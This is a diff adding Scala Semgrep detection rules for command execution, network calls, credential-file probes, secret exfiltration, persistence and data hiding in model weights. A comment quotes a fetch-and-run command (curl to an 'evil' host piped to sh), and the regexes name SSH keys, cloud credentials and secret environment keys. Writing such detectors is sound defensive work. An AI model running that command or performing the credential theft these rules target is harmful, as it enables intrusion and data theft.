@@ -1,0 +1,457 @@
+# Semgrep rules for Scala code security audit
+# Rule families align with TAA canonical 13-rule specification.
+#
+# Where a family's discriminator in the Python pack is the *name* of an argument
+# (a dataset-shaped payload, a credential-shaped path, a secret-shaped
+# environment key), the same predicate is applied here rather than flagging
+# every read, write and environment lookup in the language.
+#
+# Scala is the least mature language in this GA set, so three things were
+# measured on semgrep 1.177.0 before thirteen rules were written on top of them.
+#
+#   1. The language parses, and taint mode works. A source reaches a sink
+#      through assignment and through string concatenation with no propagator
+#      declared (measured with a source on one line and the sink on another);
+#      only the conversions that lose the value's identity need one. The EXF arm
+#      below is therefore a real taint rule, not a documented fallback.
+#   2. A qualified callee has to be spelled exactly, with no suffix matching on
+#      the dotted name: `Source.fromURL(...)` does not match
+#      `scala.io.Source.fromURL(...)`, and `Files.write(...)` does not match
+#      `java.nio.file.Files.write(...)`. This is a property of the engine rather
+#      than of this language - the Java pack misses the same fully qualified
+#      `java.nio.file.Files.write` call site (measured) - so the convention here
+#      is the import-style spelling every pack uses, with the fully qualified
+#      companion listed only where Scala code genuinely writes one.
+#   3. A metavariable bound to a string literal binds WITH its delimiters: `"x"`
+#      as `"x"`, `"""x"""` as `"""x"""`. Every path and name predicate is
+#      therefore written with a leading `.*` instead of a literal `"` or a `^`
+#      on the keyword, which is correct under either binding and is already the
+#      form the Java and JavaScript packs use.
+#
+# One measured parser quirk is recorded where it hurts (see taa-fil-probe-scala):
+# `raw"..."` with no `$` substitution binds a metavariable whose text is a
+# single `"`, so a metavariable-regex cannot see the literal's contents.
+rules:
+  - id: taa-cmd-exec-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Suspicious process execution detected in Scala code"
+    metadata:
+      category: execution
+      rule_family: CMD_001
+    # scala.sys.process gives this language two ways to run a command that no
+    # other pack in the tree has: the postfix `!` and `!!` operators on a string.
+    # They read as punctuation rather than as a call, so a review that stops at
+    # Runtime.exec walks straight past `"curl http://evil | sh".!`. Both are
+    # listed because they are separate selectors in the grammar and neither
+    # covers the other (measured: a pattern for one reports only its own line).
+    #
+    # `Process(...)` is written once, unqualified, and the qualified spelling is
+    # a second branch rather than a cosmetic duplicate: per measurement (2) in
+    # the header the unqualified pattern does not reach
+    # `scala.sys.process.Process(...)`, and that is how the entry point is
+    # written in code that does not import the package. `ProcessBuilder(...)` and
+    # `new ProcessBuilder(...)` are separate branches for the same reason - they
+    # are the Scala apply and the java.lang.ProcessBuilder constructor, and a
+    # construct-call site matches exactly one of them (measured).
+    pattern-either:
+      - pattern: $CMD.!
+      - pattern: $CMD.!!
+      - pattern: Process(...)
+      - pattern: scala.sys.process.Process(...)
+      - pattern: ProcessBuilder(...)
+      - pattern: new ProcessBuilder(...)
+      - pattern: Runtime.getRuntime().exec(...)
+
+  - id: taa-net-general-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Suspicious external network request detected in Scala code"
+    metadata:
+      category: network
+      rule_family: NET_001
+    # The family is "an outbound request", so every client in mainstream use is
+    # listed rather than the modern one: this is a JVM language whose code is
+    # routinely ten years old, and the old clients are the ones a dropper reaches
+    # for because they are present in every JDK.
+    #
+    # `Source.fromURL` is the branch that matters most here and has no analogue
+    # in any other pack: it is the standard library's own one-call HTTP fetch,
+    # available with no dependency at all, and it is spelled fully qualified in
+    # real code often enough that the second branch is not redundant - per
+    # measurement (2) in the header, one spelling never matches the other.
+    pattern-either:
+      - pattern: Source.fromURL(...)
+      - pattern: scala.io.Source.fromURL(...)
+      - pattern: new URL(...).openStream()
+      - pattern: new URL(...).openConnection(...)
+      - pattern: $CONN.getInputStream()
+      - pattern: HttpClient.newHttpClient(...)
+      - pattern: HttpClient.newBuilder(...)
+      - pattern: $CLIENT.send($REQ, ...)
+      - pattern: requests.$METHOD($URL, ...)
+      - pattern: $HTTP.execute(...)
+
+  - id: taa-net-socket-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Raw socket communication detected in Scala code"
+    metadata:
+      category: network
+      rule_family: NET_002
+    # The raw forms only. A socket opener is the family's whole signal, so unlike
+    # the Python pack's socket.socket() there is nothing to discriminate on and
+    # no argument predicate to add.
+    pattern-either:
+      - pattern: new Socket(...)
+      - pattern: new DatagramSocket(...)
+      - pattern: new ServerSocket(...)
+      - pattern: SocketChannel.open(...)
+      - pattern: DatagramChannel.open(...)
+
+  - id: taa-dyn-eval-scala
+    languages: [scala]
+    severity: WARNING
+    message: "Dynamic code evaluation or dangerous reflection detected in Scala code"
+    metadata:
+      category: dynamic
+      rule_family: DYN_001
+    # The Python arm's shape - the reflective entry points, not a source-to-sink
+    # flow. The JVM half (class loading by name, reflective member invocation) is
+    # the same as the Java pack's, because it is literally the same class
+    # library.
+    #
+    # The last two branches are Scala's own and the reason this arm is not just
+    # a copy of the Java one. `runtimeMirror(...)` is the entry point of the
+    # reflection API this language ships itself, and `eval` is
+    # scala.tools.reflect.ToolBox - it compiles a *string* into a class and runs
+    # it inside the current process, which is Scala's `eval` and its most direct
+    # one. `$TB.eval(...)` is deliberately loose (it is any receiver named eval)
+    # because the toolbox is usually reached through a local val; the family is
+    # WARNING severity for exactly that reason, and a tighter form would also be
+    # a narrower one.
+    pattern-either:
+      - pattern: Class.forName(...)
+      - pattern: $LOADER.loadClass(...)
+      - pattern: $METHOD.invoke(...)
+      - pattern: $CONSTRUCTOR.newInstance(...)
+      - pattern: runtimeMirror(...)
+      - pattern: $TB.eval(...)
+
+  - id: taa-fil-probe-scala
+    languages: [scala]
+    severity: WARNING
+    message: "Sensitive credential file access probe detected"
+    metadata:
+      category: credential
+      rule_family: FIL_001
+    # Discriminated on the *path* naming a credential store, as the Python arm
+    # is: `Source.fromFile($PATH)` with no predicate is every file read in the
+    # language, so without it the rule reports every config load and the family
+    # stops meaning "credential probe".
+    #
+    # The call patterns bind a string literal (`"$PATH"`) so that this branch and
+    # the assembled-path branch below cannot both match one line: a call whose
+    # argument is a `Paths.get(...)` node belongs to the second branch, and the
+    # engine turns every semgrep result into its own finding, so an overlap at
+    # two different ranges would report the same line twice. The binding also
+    # costs coverage that is worth naming: an interpolated argument
+    # (`Source.fromFile(s"$home/.ssh/id_rsa")`) is a different node and is not
+    # matched by either branch.
+    #
+    # Measured parser quirk, recorded because it is invisible from here: a
+    # `raw"..."` literal with no `$` substitution binds a metavariable whose text
+    # is a single `"`. A credential path written that way is not seen by the
+    # predicate, and no regex can recover it, since the literal's contents never
+    # reach the metavariable.
+    #
+    # The path predicate carries no surrounding quotes and is written with a
+    # leading `.*` so that it is correct whichever way the delimiters bind.
+    pattern-either:
+      - patterns:
+          - pattern-either:
+              - pattern: Source.fromFile("$PATH")
+              - pattern: scala.io.Source.fromFile("$PATH")
+              - pattern: Files.readAllBytes("$PATH")
+              - pattern: Files.readString("$PATH")
+              - pattern: new FileInputStream("$PATH")
+              - pattern: new FileReader("$PATH")
+              - pattern: new File("$PATH")
+          - metavariable-regex:
+              metavariable: $PATH
+              regex: (?i).*(\.ssh|\.env|password|credential|\.aws|\.kube|id_rsa|authorized_keys|\.netrc)
+      - patterns:
+          - pattern-either:
+              - pattern: Paths.get(..., $BASE)
+              - pattern: Path.of(..., $BASE)
+          - metavariable-regex:
+              metavariable: $BASE
+              regex: (?i).*(\.ssh|\.env|id_rsa|authorized_keys|\.netrc|credential)
+
+  - id: taa-env-secret-scala
+    languages: [scala]
+    severity: WARNING
+    message: "Sensitive environment variable access detected in Scala code"
+    metadata:
+      category: credential
+      rule_family: ENV_001
+    # Constrained by name, as the Python arm is: `sys.env` with no predicate is
+    # every environment read the process makes. Scala reaches the environment
+    # through its own `sys.env` (a Map-like object) and through the JVM's
+    # System.getenv, and both are listed, because which one a script uses is a
+    # matter of taste and a finding that depends on taste is not a finding.
+    #
+    # The key is written quoted so it binds a string literal only: the Python arm
+    # does not flag an indirection (`sys.env(keyVar)`) and this arm must not
+    # either. `sys.env.get` is written in the variadic form alone - it covers the
+    # one-argument and the defaulted call (measured), and listing both arities
+    # would put two branches on one call.
+    #
+    # The keyword regex allows any prefix and suffix because the keywords are
+    # fixed but their position in the name is not (AWS_SECRET_ACCESS_KEY,
+    # SECRET_TOKEN, MY_API_KEY).
+    patterns:
+      - pattern-either:
+          - pattern: sys.env("$KEY")
+          - pattern: sys.env.get("$KEY", ...)
+          - pattern: System.getenv("$KEY")
+      - metavariable-regex:
+          metavariable: $KEY
+          regex: "(?i).*(?:secret|token|api[_-]?key|access[_-]?key|private[_-]?key|password|passwd|pwd|cred|credential|auth|session|cookie|kube|aws|gcp|azure|github|gitlab).*"
+
+  - id: taa-obf-exec-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Encoded or deserialized payload construction detected in Scala code"
+    metadata:
+      category: payload
+      rule_family: OBF_001
+    # Same shape as the Python arm: the *use* of a decoder or a deserializer, not
+    # a decode-into-eval flow, which is strictly narrower (a payload that is
+    # decoded and then exfiltrated is invisible to the taint version).
+    #
+    # The first three branches name java.util.Base64 because it is this
+    # ecosystem's decoder of record and the first hop of nearly every staged
+    # loader; the fourth is the same idea written through a local. The two
+    # overlap on a line that writes `Base64.getDecoder().decode(...)` outright,
+    # at ranges the engine considers identical, and it collapses them into one
+    # result rather than reporting the line twice - this is what the Java pack's
+    # identical branch pair does too, and it is why the pair is kept here instead
+    # of being read as a double count.
+    #
+    # `defineClass` and `readObject` are the branches with no Python analogue:
+    # both turn a byte array into a loaded class or a live object graph without
+    # ever touching disk, which is how a stage-2 payload runs on the JVM.
+    pattern-either:
+      - pattern: Base64.getDecoder().decode(...)
+      - pattern: Base64.getUrlDecoder().decode(...)
+      - pattern: Base64.getMimeDecoder().decode(...)
+      - pattern: $DECODER.decode(...)
+      - pattern: new ObjectInputStream(...)
+      - pattern: $OIS.readObject()
+      - pattern: $LOADER.defineClass(...)
+      - pattern: new GZIPInputStream(...)
+      - pattern: new InflaterInputStream(...)
+
+  - id: taa-secret-exfiltration-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Sensitive credential flows from source to external network sink"
+    metadata:
+      category: credential
+      rule_family: EXF_001
+    # The Python arm's three-part shape, and it was measured before it was relied
+    # on: taint is supported for this language and propagates through assignment
+    # and through string concatenation with no propagator declared (verified with
+    # the source and the sink on separate lines, which is the only form that
+    # proves propagation rather than a syntactic source-in-sink match).
+    #
+    # That measurement is what decides the propagator list: the conversions that
+    # keep the value's identity need no declaration, so only the ones that lose
+    # it are named. `append` matters because StringBuilder is how this ecosystem
+    # builds a payload without the compiler folding it into one expression, and
+    # it was measured *not* to propagate on its own - without this entry the
+    # StringBuilder idiom is a false negative.
+    #
+    # The sinks are the outbound request surfaces of the same language version as
+    # NET_001, and the sanitizers are the JVM's digest entry points: a hash of a
+    # secret is not the secret leaving.
+    mode: taint
+    pattern-sources:
+      - pattern: sys.env($KEY)
+      - pattern: System.getenv($KEY)
+      - pattern: Source.fromFile($PATH)
+      - pattern: scala.io.Source.fromFile($PATH)
+      - pattern: Files.readAllBytes($PATH)
+      - pattern: new FileInputStream($PATH)
+    pattern-propagators:
+      - pattern: $SB.append($IN)
+        from: $IN
+        to: $SB
+      - pattern: $OUT = new String($IN)
+        from: $IN
+        to: $OUT
+      - pattern: $OUT = Base64.getEncoder().encodeToString($IN)
+        from: $IN
+        to: $OUT
+    pattern-sanitizers:
+      - pattern: MessageDigest.getInstance(...)
+      - pattern: $MD.digest(...)
+      - pattern: Mac.getInstance(...)
+    pattern-sinks:
+      - pattern: Source.fromURL($URL)
+      - pattern: scala.io.Source.fromURL($URL)
+      - pattern: new URL($URL)
+      - pattern: $CLIENT.send($REQ, ...)
+      - pattern: new Socket($HOST, $PORT)
+      - pattern: requests.post($URL, ...)
+
+  - id: taa-per-backdoor-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Persistence backdoor or autorun script modification detected"
+    metadata:
+      category: persistence
+      rule_family: PER_001
+    # Text mirror of the Python arm with Scala's comment prefix, plus the one
+    # persistence primitive the mirror cannot see.
+    #
+    # The mirror is faithful rather than approximate on purpose: the baseline it
+    # matches is a line-level text search, so `pattern-regex` is the right
+    # instrument and `^(?![ \t]*//)` is part of the mirror, not an addition -
+    # the baseline skips a line whose first non-space characters are a comment,
+    # and a regex has no notion of one.
+    #
+    # A "file write whose destination names a profile" branch is deliberately
+    # absent: the path literal is on that line by construction, so the branch
+    # would match what the mirror already matched, at a different range, and the
+    # engine would report the same line twice for one family.
+    #
+    # What a text search cannot see, and the reason this arm has an AST branch at
+    # all, is a shutdown hook: it arranges for the payload to re-run without
+    # writing a profile, a crontab or a unit file anywhere. Scala has its own
+    # wrapper for it (`scala.sys.addShutdownHook`, which is what a Scala program
+    # uses) and the JVM's, and the mirror sees neither.
+    pattern-either:
+      - pattern-regex: ^(?![ \t]*//)[^\n]*crontab
+      - pattern-regex: ^(?![ \t]*//)[^\n]*(?:\.bashrc|\.bash_profile|\.zshrc|\.profile)
+      - pattern-regex: ^(?![ \t]*//)[^\n]*systemctl\s+(?:enable|start)
+      - pattern-regex: ^(?![ \t]*//)[^\n]*/etc/init\.d
+      - pattern-regex: ^(?![ \t]*//)[^\n]*/etc/systemd
+      - pattern: sys.addShutdownHook(...)
+      - pattern: Runtime.getRuntime().addShutdownHook(...)
+
+  - id: taa-emb-data-dump-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Raw dataset or sensitive features serialized to output file"
+    metadata:
+      category: embedded
+      rule_family: EMB_001
+    # Discriminated on the *payload* naming a dataset, as the Python arm is: a
+    # checkpoint write of weights is not this family, and the predicate is what
+    # keeps it out.
+    #
+    # Every write branch is written in the variadic form alone. It covers the
+    # two-argument and the three-argument overload (measured), and listing the
+    # exact arity beside it would put two branches on one call - the Java pack
+    # carries that pair and the engine collapses the identical ranges, so this is
+    # a cleanup rather than a behaviour change.
+    #
+    # `$WRITER.write($DATA)` is the loose branch, inherited from the Java and
+    # JavaScript arms: any one-argument write qualifies, and the predicate on the
+    # payload is what makes it a finding rather than noise.
+    pattern-either:
+      - patterns:
+          - pattern-either:
+              - pattern: Files.write($PATH, $DATA, ...)
+              - pattern: Files.writeString($PATH, $DATA, ...)
+              - pattern: $OOS.writeObject($DATA)
+              - pattern: $WRITER.write($DATA)
+          - metavariable-regex:
+              metavariable: $DATA
+              regex: "^(?:raw_|train_|test_)?(?:data|dataset|images|samples|x_train|y_train|features)\\b"
+
+  - id: taa-emb-copy-export-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Sensitive data or models copied to export/result directory"
+    metadata:
+      category: embedded
+      rule_family: EMB_002
+    # Destination-discriminated, as the Python arm is: copying anything anywhere
+    # is not this family, copying it into output/, export/ or result/ is.
+    # `Files.copy` and `Files.move` both take the destination second, so unlike
+    # the Go arm one metavariable position serves both. The variadic form covers
+    # both overloads on its own (measured); the exact-arity twin the Java pack
+    # carries is not repeated, since it matches the same call at the same range
+    # and the engine collapses the two into one result.
+    pattern-either:
+      - patterns:
+          - pattern-either:
+              - pattern: Files.copy($SRC, $DST, ...)
+              - pattern: Files.move($SRC, $DST, ...)
+          - metavariable-regex:
+              metavariable: $DST
+              regex: (?i).*(output|export|result).*
+
+  - id: taa-emb-log-dump-scala
+    languages: [scala]
+    severity: WARNING
+    message: "Raw sample data or sensitive features dumped to standard log/output"
+    metadata:
+      category: embedded
+      rule_family: EMB_003
+    # The family is about the *argument*, not the logging call, so every branch
+    # carries the same dataset-name predicate and the predicate is anchored the
+    # way the baseline regex is - it matches the first argument, not a substring
+    # anywhere in the call.
+    #
+    # Scala's print entry points are `println`/`print` (methods on Predef, so
+    # they appear bare), Predef's qualified spellings, and `Console.println`.
+    # They do not match each other (measured: a `println` pattern reports only
+    # its own line), so all of them are listed: which one a training script uses
+    # is a matter of taste, and a finding that depends on taste is not a finding.
+    pattern-either:
+      - patterns:
+          - pattern-either:
+              - pattern: println($ARG)
+              - pattern: print($ARG)
+              - pattern: System.out.println($ARG)
+              - pattern: System.err.println($ARG)
+              - pattern: Console.println($ARG)
+          - metavariable-regex:
+              metavariable: $ARG
+              regex: "^(?:raw_|train_|test_)?(?:data|dataset|images|samples|batch|x_train|y_train)\\b"
+      - patterns:
+          - pattern-either:
+              - pattern: $LOG.info($ARG)
+              - pattern: $LOG.debug($ARG)
+              - pattern: $LOG.warn($ARG)
+          - metavariable-regex:
+              metavariable: $ARG
+              regex: "^(?:raw_|train_|test_)?(?:data|dataset|images|samples|batch|x_train|y_train)\\b"
+
+  - id: taa-emb-stego-weight-scala
+    languages: [scala]
+    severity: ERROR
+    message: "Encoded data or steganographic payload embedded into model weights"
+    metadata:
+      category: embedded
+      rule_family: EMB_004
+    # A text mirror like the Python arm's, and for the same reason: the family is
+    # "an encode/decode step meeting a weights artefact", which is a textual
+    # coincidence rather than a syntax, so there is no AST to write it against.
+    # The codec names are translated to this platform's encoders (java.util
+    # Base64, the java.util.zip readers, ObjectOutputStream), and the save verb
+    # gains this ecosystem's `write`, since nothing here is called save.
+    #
+    # The branches are kept disjoint on a line because a pattern-regex match
+    # spans the whole line: two branches that both matched one line would report
+    # two results at one range, and leaning on the engine to collapse them is not
+    # the same as not having written them.
+    pattern-either:
+      - pattern-regex: ^(?![ \t]*//)[^\n]*(?:(?:state_dict|weights|params).*(?:hidden|secret|payload|stego|embed|hide)(_?data)?)
+      - pattern-regex: ^(?![ \t]*//)[^\n]*(?:[Bb]ase64.*(?:[Ss]ave|[Ww]rite)|(?:[Ss]ave|[Ww]rite).*[Bb]ase64)
+      - pattern-regex: ^(?![ \t]*//)[^\n]*(?:[Ee]ncode.*[Ww]eights|[Ww]eights.*[Ee]ncode)
+      - pattern-regex: ^(?![ \t]*//)[^\n]*(?:(?:[Zz]lib|[Gg]zip|[Dd]eflate|[Oo]bjectOutputStream).*(?:[Ss]ave|[Ww]rite)|(?:[Ss]ave|[Ww]rite).*(?:[Zz]lib|[Gg]zip|[Dd]eflate|[Oo]bjectOutputStream))
